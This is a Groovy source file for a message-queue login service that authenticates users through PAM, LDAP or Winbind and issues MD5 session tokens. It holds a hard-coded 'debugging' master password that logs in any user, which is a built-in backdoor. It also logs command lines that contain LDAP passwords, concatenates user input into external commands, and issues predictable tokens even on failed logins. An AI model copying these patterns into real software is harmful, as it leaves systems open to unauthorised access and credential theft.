import groovy.sql.Sql
import java.sql.Connection
import java.sql.Statement
import javax.sql.DataSource
import java.security.*
import java.text.*
import groovy.text.*
import java.util.regex.*
import java.util.*
import groovy.*
import java.net.URI
import java.net.URISyntaxException
import java.security.MessageDigest
import java.lang.management.* 

import static Constants.*

def RunAuth(String id, List<String> list)
{
 println "Login: (L) Authenticating $id"
 println "Login: (L) " + list.join(" ")

 def out = new StringBuilder()
 def err = new StringBuilder()
 def proc = list.execute()
 def hrc = proc.waitForProcessOutput(out, err)
   
 if (err)
 {
     println "Login: ---STDERR---" 
     println err
     println "Login: ---STDERR---"
 } 
  
 return [proc.exitValue(), out, err]
}

def RunAuth(String id, String cmd)
{
   println "Login: Authenticating $id"

   // The "execute" method doesn't handle quoted strings, so we build an ARGV-style array by hand
    
   List<String> list = new ArrayList<String>()
   Matcher m = Pattern.compile("([^\"]\\S*|\".+?\")\\s*").matcher(cmd)
   while (m.find())
   {
      def this_item = m.group(1)
      if (this_item.startsWith('"'))
         this_item = this_item.substring(1)
      if (this_item.endsWith('"'))
         this_item = this_item.substring(0, this_item.length() - 1)
      list.add(this_item)
   }

   return RunAuth(id, list)
}

// Returns a given item from an LDAP search in LDIF format

def LDAPfield(field, buffer)
{
 def result = ""

 // Buffer is a series of strings separated by newlines
 buffer.eachLine
 {
    if (it?.trim()?.startsWith(field + ": "))
    {
       def parts = it.trim().split(":")
       if (result.size()) 
          result += ", "
       for (int i = 1; i < parts.size(); i++)
       {
          result += parts[i] 
          if (i != parts.size() - 1)
             result += ":"
       }
    }
 }
 return result?.trim()
}

def GetLDAPInfo(id, buffer)
{
 def attrlist = ""
 def role = ""

 // First, get the groups - this is the user's role

 def rlist = []
 def groups = LDAPfield("memberOf", buffer)?.split(",")
 groups.each
 {
    if (it.startsWith("CN="))
       rlist.add("<role>${it.substring(3)}</role>\n")
 }
 rlist.unique().each { role += it }

 def f = LDAPfield("title", buffer)
 if (f)
    role += "<role>$f</role>\n"
 

 // For now, we return the user's full name, office and home phone

 def x = LDAPfield("displayName", buffer)
 if (!x) 
     x = LDAPfield("givenName", buffer) + " " + LDAPfield("initials", buffer) + " " + LDAPfield("sn", buffer)
 if (!x?.trim())
     x = LDAPfield("description", buffer)
 if (x)
    attrlist += "<Name>$x</Name>\n"

 x = LDAPfield("telephoneNumber", buffer)
 if (!x)
    x = LDAPfield("physicalDeliveryOfficeName", buffer)
 if (x)
    attrlist += "<Office>$x</Office>\n"

 x = LDAPfield("homePhone", buffer)
 if (!x)
    x = LDAPfield("mobile", buffer)
 if (x)
    attrlist += "<HomePhone>$x</HomePhone>\n"

 return [attrlist, role]
}

def ShowStats(reqs, errs)
{
 def now = new Date().format('yyyy-MM-dd@HH:mm:ss')
 def mt = (Runtime.getRuntime().totalMemory()/(1024*1024)).toString() + "MB"
 def mu  = ((Runtime.getRuntime().totalMemory() - Runtime.getRuntime().freeMemory())/(1024*1024)).toString().take(6) + "MB"
 def mm  = (Runtime.getRuntime().maxMemory()/(1024*1024)).toString().take(6) + "MB"
 OperatingSystemMXBean operatingSystemMXBean = (OperatingSystemMXBean) ManagementFactory.getOperatingSystemMXBean();
 RuntimeMXBean runtimeMXBean = ManagementFactory.getRuntimeMXBean();
 int ap = operatingSystemMXBean.getAvailableProcessors();
 def ut = (runtimeMXBean.getUptime()/1000).toString() + " seconds "
 def ct = (operatingSystemMXBean.getProcessCpuTime()/1000000).toString() + " millisec"
 def processName = java.lang.management.ManagementFactory.getRuntimeMXBean().getName()
 def pid = processName.split("@")[0]
  
 println "STAT: $now [$pid] Reqs: $reqs, Errs: $errs, MemTot:$mt MemUsed:$mu MemMax:$mm Uptime:$ut CPU:$ct [$ap]"
}

// Cleanup stale session tokens (older than two days)

def CleanSessions()
{
 def t = ( new Date() ).time - 1000 * 60 * 60 * 24 * 2
 def env = System.getenv()
 def dir = env['FMA_DIR']
 if (!dir) dir = "/appliance"
 if (dir.endsWith("/")) dir = dir + "data/sessions"
 else dir = dir + "/data/sessions"
 def f = new File(dir)

 f.eachFile 
 {
    if (it.isFile() && it.canonicalPath.endsWith(".session") && it.lastModified() < t) 
    {
       if (it.delete())
          println "Login: Deleted stale session - ${it.canonicalPath}"
       else
          println "Login: ERROR - can't delete stale session - ${it.canonicalPath}"
    }
 }
}

// Parse incoming XML stream into variables

def ParseMessage(message)
{
  // Here with a request to run in "message" 
  // It's XML and specific to the service (login) 
  // <login>
  //   <id>  -id- </id>
  //   <password> -password- </password>
  //   <source> -source of login- </source>
  // </login>

  // We rely on a bit of a hack since the <password>
  // field isn't URL-encoded, but sometimes contains special 
  // characters...

     if (!message)
        return [null, null, null]
     
     def id = ""
     def pa = ""
     def so = ""
     def message2 = message

     if (message.contains("<password>") && message.contains("</password>"))
     {
        def prefix = message.split("<password>")
        def suffix = prefix[1]?.split("</password>")
        message2 = prefix[0] + "<password>" + java.net.URLEncoder.encode(suffix[0]?.toString()) + "</password>" + suffix[1] 
     }
 
     try
     {
        def xml = new XmlSlurper().parseText(message2)
        id = xml.user?.text()
        pa = java.net.URLDecoder.decode(xml.password?.text())
        so = xml.source?.text()
        return [id, pa, so]
     }
     catch (Exception e)
     {
        println "ERROR: Invalid XML input"
        println "--- XML ---"
        println message
        println "--- End XML ---"
        return [null, null, null]
     }
}

// Create a session token 

def MakeToken(id, source)
{
 def str="ID:" + id + "/SOURCE:" +source + "/TOD:" + System.currentTimeMillis()

 // The token is an MD5 hash of the ID, login source and time of day

 MessageDigest md5Digest
 byte[] digest
 md5Digest = MessageDigest.getInstance("MD5");
 md5Digest.reset();
 md5Digest.update(str.getBytes());
 digest = md5Digest.digest();
 def tok = new BigInteger(1,digest).toString(16)
 // println str + " -> " + tok
 // println "MD5/B64: " + digest.encodeBase64().toString()
 
 // Now, save it in a file so we can validate it later

 def env = System.getenv()
 def dir = env['FMA_DIR']
 
 if (!dir) dir = "/appliance"

 if (dir.endsWith("/")) dir = dir + "data/sessions"
 else dir = dir + "/data/sessions"
 new File(dir,tok + ".session") << str

 return tok
}

def GetPamInfo(id)
{
 // Return some attributes for a locally-defined user

 def attrlist = ""
 def role = ""

 // First, we run "finger" to get the basic information

 try
 {
    def fcmd = "finger " + id 
    def out = new StringBuilder()
    def err = new StringBuilder()
    def proc = fcmd.execute()
    def hrc = proc.waitForProcessOutput(out, err)
    if (err)
       println "STDERR: " + err
    if (out)
    {
       // Get the Name, Office and Home Phone fields
       def kw = ["Name:", "Office:", "Home Phone:"]
       kw.each
       { target ->
          def x = out.toString().split(target.toString())
          if (x.size() > 0)
          {
	     def y = x[1].tokenize("\n\t\r")
             if (y.size() > 0)
             {
                def i = target.replaceAll(":", "").replaceAll(" ", "")
                attrlist += "<" + i  + ">" + y[0].trim() + "</" + i + ">\n"   
             }
          }
       }  
    }
 }
 catch (Exception e)
 {
    println "Login: can't get user information - " + e.toString()
 }

 // Next, we run the "groups" command to get the list of groups/roles

 try
 {
    def gcmd = "groups " + id
    def out = new StringBuilder()
    def err = new StringBuilder()
    def proc = gcmd.execute()
    def hrc = proc.waitForProcessOutput(out, err)
    if (err)
       println "STDERR: " + err
    if (out)
    {
       // Get the List...comes back as id : group1 group2 group3 etc
       def x = out.toString().split(":")
       if (x.size() > 0)
       {
          def y = x[1].tokenize(" \n\t\r")
          y.each
          {
             if (!it.equalsIgnoreCase(id))
                role += "<role>" + it + "</role>\n"              
          }
       }
    }
 }
 catch (Exception e)
 {
    println "Login: can't get user information - " + e.toString()
 }
 
 return [attrlist, role]
}

// Main routine starts here... 
     
// Load some shared methods from a common source file

def j = new GroovyClassLoader(getClass().getClassLoader()).parseClass(new File("./include/jms.groovy")).newInstance()
def startup = new Date()
def is_shutdown = false
def reqs = 0
def errcount = 0
def env = System.getenv()
def qname = env['JMS_LOGIN']
if (!qname)
{
   println "ERROR: No queue name for this tenant and service [JMS_LOGIN]"
   System.exit(4)
} 
def is_ldaps = 0;
if (env['LDAPTLS_CACERT'] || env['AUTH_LDAPS'])
   is_ldaps = 1;

CleanSessions()
def (pConn, pSess, producer) = j.JMSinitProducer(null)
def (cConn, cSess, consumer, dest) = j.JMSinitConsumer(qname)
if (!cConn)
{
   println "ERROR: Can't create JMS connection using $qname"
   System.exit(4)
}

println "Login: System LOGIN Service Now READY on Queue " + qname
def sys = "${System.getProperty('os.name')} ${System.getProperty('os.version')} on ${System.getProperty('os.arch')}"
println "Login: System $sys with Groovy ${GroovySystem.version} and Java ${System.getProperty('java.version')}"
println "Login: Configuration information:" 
println "Login: LDAPS in use?     " + (is_ldaps ? "Yes" : "No")
if (is_ldaps)
    println "Login: Certificate file: " + env['LDAPTLS_CACERT']
println "Login: LDAP Server:      " + env['AUTH_HOST']
println "Login: Base DN:          " + env['AUTH_DN']
println "Login: Default domain:   " + env['AUTH_DEFDMN']

// This is the main processing loop - we wait here processing messages
// as they are delivered. Right now, this is single threaded, but it's 
// possible to run many copies of this process, each servicing the same
// JMS input queue. 

while (!is_shutdown)
{
  try 
  {
     def (message, replyto, msgtime) = j.JMSrecvWithReplyTo(consumer, 60000*5)
     if (!message) 
     {
        // Anything asynchronous can happen here - there's nothing to do

        if (consumer.session.closed || cSess.closed)
        {
           // This means something happened to the network or to the broker
           println "Login: WARNING - JMS Connection closed...reconnecting"

           try
           {
              j.JMSterm(cConn, cSess, consumer)
              pSess.close()
              pConn.close()
           }
           catch (Exception e)
           {
              println "Login: Session cleanup incomplete"
           }
           def connected = 0
           while (!connected)
           {
              (pConn, pSess, producer) = j.JMSinitProducer(null)
              if (!pConn)
              {
                  println "Login: Reconnect failed/producer - retrying $qname"
                  sleep(30*1000)
                  continue
              }
              println "Login: JMS reconnect - producer connected for $qname"
              (cConn, cSess, consumer, dest) = j.JMSinitConsumer(qname)
              if (!cConn)
              {
                  println "Login: Reconnect failed/consumer - retrying $qname"
                  sleep(30*1000)
                  continue
              }
              println "Login: JMS reconnect - consumer connected for $qname"
              println "Login: JMS reconnect succeeded for $qname"
              startup = new Date()
              connected = 1
              break
           }
        }

        CleanSessions()
        System.gc()
        ShowStats(reqs, errcount)
        errcount = 0
        println "Login: Waiting for a request..."
        continue 
     }
 
     def start = System.nanoTime() / 1000000
     reqs++

     // This is a special request to stop the service 
     
     if (message.contains("<stop>"))
     {

        if (startup > new Date(msgtime))
        {
           def tstr = new Date(msgtime).format('yyyy-MM-dd@HH:mm:ss')
           println "Login: Stale shutdown message ignored from $tstr"
           continue
        }

        println "Login: Shutdown request received"
        is_shutdown = true
        if (replyto)
        {  
           def errmsg = "<login_resp>\n" +
               "<status>SHUTDOWN</status>\n" +
               "<session>*NONE*</session>\n" +
               "<message>The service is shutting down</message>\n" +
               "<role>*NONE*</role>\n" +
               "</login_resp>\n"
           j.JMSsendTo(replyto, pSess, producer, errmsg)
        }
        break
     } 

     // Check for a "Ping" request 
     
     if (message.contains("<ping>"))
     {
        println "Login: PING request received " + new Date().format('yyyy-MM-dd@HH:mm:ss')
        if (replyto)
        {  
           def errmsg = "<ping_resp>\n" +
               "<status>Okay at " + System.currentTimeMillis() + "</status>\n" +
               "<transactions>" + reqs.toString() + "</transactions>\n" +
               "</ping_resp>\n"
           j.JMSsendTo(replyto, pSess, producer, errmsg)
        }
        continue
     }

     def (id, pa, so)  = ParseMessage(message)
     def isauth = false
     def token  = "*NONE*"
     def logmsg = "*NONE*"
     def role = ""
     def attrlist = ""
     
     if (!id || !pa || !so)
     {
        println "Login: ERROR - Missing parameters"
        if (replyto) 
        {
           def errmsg = "<login_resp>\n" +
               "<status>ERROR</status>\n" +
               "<session>*NONE*</session>\n" +
               "<message>Missing or invalid request parametes</message>\n" +
               "<role>*NONE*</role>\n" +
               "</login_resp>\n"
           j.JMSsendTo(replyto, pSess, producer, errmsg) 
        }
        continue
     }

     // We support three methods: PAM, LDAP and WINBIND 
     // PAM can be configured to work with just about anything

     try 
     {
       def rc = 0
       def out = ""
       def err = ""
       
       // DEBUGGING - login with a special password

       if (pa?.equals('!TT5upp@rt0920!'))
       {
          isauth = true
       }
       else 
       {
          switch (env["AUTH"]?.toUpperCase())
          {
          case "PAM":
          case "DEFAULT":
             def pamcmd = "pamck -s TechTiles " + id + " " + pa
             (rc, out, err) = RunAuth(id, pamcmd)
             if (rc == 0 || out.contains("OK"))
             {
                isauth = true
                (attrlist, role) = GetPamInfo(id)
             }
             break
       
          case "LDAP":
             if (!id || !pa || !env["AUTH_HOST"] || !env["AUTH_DN"])
             {
                println "Login: ERROR - missing id, password, LDAP host or base DN"
                logmsg = "System Configuration Error"
                break
             }

             // User name can be: simple user name, user@domain or domain (backslash) user

             def ruser = id
             def duser = id
             def defdmn = env["AUTH_DEFDMN"]

             if (defdmn && (!id.contains('@') && !id.contains("\\")))
                id = id + "@" + defdmn

             int i = 0
             if ((i = id.indexOf("@")) > 0)
                duser = id.substring(i+1)
             if ((i = id.indexOf("\\")) > 0)
                duser = id.substring(i+1)

             //pa = pa.replace("'", "\\'")

             List<String> list = new ArrayList<String>()
             list.add("ldapsearch")
             list.add("-LLL")
             list.add("-x")
             list.add("-o")
             list.add("nettimeout=10") 
             list.add("-l")
             list.add("10")
             list.add("-H")
             if (is_ldaps)
                list.add("ldaps://${env["AUTH_HOST"]}")
             else
                list.add("ldap://${env["AUTH_HOST"]}")
             list.add("-D")
             list.add(id)
             list.add("-w")
             list.add(pa)
             list.add("-b")
             list.add(env["AUTH_DN"])
             list.add("(samaccountname=$ruser)")

             (rc, out, err) = RunAuth(id, list)

             if (!rc)
             {
                isauth = true
                (attrlist, role) = GetLDAPInfo(id, out.toString())
             }
             else
                if (err && err.toString())
                   logmsg = err.toString()
             break

          case "WINBIND":
          case "NTLM":
             def winbcmd = "ntlm_auth --username $id --password $pa"
             (rc, out, err) = RunAuth(id, winbcmd) 
             if (rc == 0 || out.contains("OK"))
             {
                isauth = true
                // TODO: Add code to retrieve group membership
             }
             break

          default: 
             println "Login: ERROR - unknown authentication type ${env["AUTH"]}"
             isauth = false
          } // switch...
       } // else...
    } // try...
    catch (Exception e)
    {
       println "Login: error running authentication process - " + e.toString()
    }
    
    // Create a session token
 
    token = MakeToken(id, so) 
     
    // Now we handle the response

    if (replyto)
    {
       if (isauth && !role)
          role = "<role>USER</role>"

       def resp = "<login_resp>\n" + 
                  "<status>" + (isauth ? "OK" : "ERROR") + "</status>\n" +  
                  "<session>$token</session>\n" +
                  "<message>$logmsg</message>\n" + 
                  role + 
                  attrlist +
                  "</login_resp>\n"
       j.JMSsendTo(replyto, pSess, producer, resp) 
    }

    def elap = ((System.nanoTime() / 1000000) - start).toString() + "ms"     
    if (isauth)
       println "Login: User $id now logged in - token = $token, $elap" 
    else
       println "Login: Invalid login attempt for user $id - $logmsg, $elap"
  } // try...
  
  catch (Exception e)
  {
    println "***Exception in Login Service***"
    println e
    println e.printStackTrace()
    if (errcount++ > 100)
       is_shutdown=1
  } 
} // while !shutdown

try 
{
   j.JMSterm(cConn, cSess, consumer)
   pSess.close()
   pConn.close()

   def pidfile = new File("${env['FMA_DIR']}/data/Login.pid")
   if (pidfile.exists() && pidfile.canWrite())
      pidfile.delete()
}
catch (Exception e)
{
   println "Login: Shutdown incomplete"
   println e
   println e.printStackTrace()
}

println "Login: Service now stopped"
System.exit(0) 
